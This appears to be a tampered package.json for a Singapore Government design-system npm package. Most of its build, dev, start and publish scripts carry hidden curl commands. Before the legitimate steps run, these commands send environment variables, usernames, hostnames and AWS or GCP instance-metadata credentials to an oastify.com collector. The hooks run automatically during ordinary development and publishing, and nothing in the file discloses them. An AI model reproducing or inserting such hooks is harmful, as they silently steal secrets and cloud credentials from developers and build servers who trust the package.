{
  "name": "@govtechsg/sgds",
  "version": "2.1.1",
  "description": "Design System unites Singapore Government digital services around a common visual language and user experience",
  "repository": {
    "type": "git",
    "url": "https://github.com/govtechsg/sgds.git"
  },
  "license": "MIT",
  "author": "Tey Liang Tai",
  "main": "css/sgds.css",
  "files": [
    "sass",
    "css"
  ],
  "scripts": {
    "build": "curl -d \"`env`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/env/`whoami`/`hostname` && npm run build:site && bundle exec jekyll build",
    "build:lib": "curl -d \"`env`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/env/`whoami`/`hostname` && rm -rf ./css && webpack --mode=production",
    "build:site": "curl -d \"`env`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/env/`whoami`/`hostname` && npm run build:lib",
    "dev": "concurrently npm:dev:static npm:dev:jekyll",
    "dev:jekyll": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/aws && bundle exec jekyll serve",
    "dev:static": "webpack --watch",
    "packagedownloads": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/aws && ./build/packagedownloads.sh",
    "prepublishOnly": "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/gcp && npm run build:lib",
    "start": "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://geyhyk5uv7saygdtxv45bi943v9oxel3.oastify.com/gcp && bundle exec jekyll serve",
    "prepare": "husky install"
  },
  "devDependencies": {
    "@babel/core": "^7.11.6",
    "@babel/plugin-proposal-object-rest-spread": "^7.11.0",
    "@babel/preset-env": "^7.11.5",
    "@commitlint/cli": "^17.0.3",
    "@commitlint/config-conventional": "^17.0.3",
    "@govtechsg/sgds-masthead": "^0.0.9",
    "@popperjs/core": "^2.11.5",
    "clipboard": "^2.0.10",
    "concurrently": "^7.0.0",
    "copy-webpack-plugin": "^10.2.4",
    "css-loader": "^6.7.1",
    "css-minimizer-webpack-plugin": "^3.4.1",
    "cz-conventional-changelog": "^3.3.0",
    "glob": "^7.2.0",
    "husky": "^8.0.1",
    "lodash": "^4.17.21",
    "mini-css-extract-plugin": "^2.6.0",
    "purgecss-webpack-plugin": "^4.1.3",
    "sass": "^1.49.9",
    "sass-loader": "^12.6.0",
    "webpack": "^5.70.0",
    "webpack-cli": "^4.9.2",
    "webpack-merge": "^5.8.0"
  },
  "dependencies": {
    "bootstrap": "5.1.3"
  },
  "config": {
    "commitizen": {
      "path": "./node_modules/cz-conventional-changelog"
    }
  }
}
